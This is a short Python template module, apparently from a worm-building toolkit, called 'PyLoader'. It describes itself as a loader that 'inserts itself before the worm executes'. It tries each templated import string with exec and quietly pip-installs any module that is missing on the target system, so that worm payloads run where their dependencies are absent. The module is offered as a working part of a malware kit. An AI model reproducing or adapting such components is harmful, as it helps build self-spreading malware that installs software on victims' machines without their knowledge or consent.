#!name##PyLoader
#!types##module
#!subTypes##mod_loader
#!info##[Py] A Python import loader that inserts itself before the worm executes and attempts to install any missing modules using pip. Useful when creating payloads where the target system may not have all required dependencies installed. Not necessary when compiling the worm into an .exe, as the compiler includes all required libraries in the executable.
#!import_FLAG##True
#!render_FLAG##True
#!TAGS##[PyS]

import sys
import subprocess

class Loader:
    def __init__(self):
        self.mods = {{_MODULES}}

    def load_mods(self):
        for mod in self.mods:
            try:
                exec(mod)
            except ModuleNotFoundError:
                self.download_mods(mod)
    
    def download_mods(self, mod_name: str) -> None:
        if mod_name.startswith("from") or mod_name.startswith("import"):
            mod = mod_name.split(" ")[1]
        else:
            mod = mod_name
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", mod])
        except:
            pass
    

LL = Loader()
LL.load_mods()
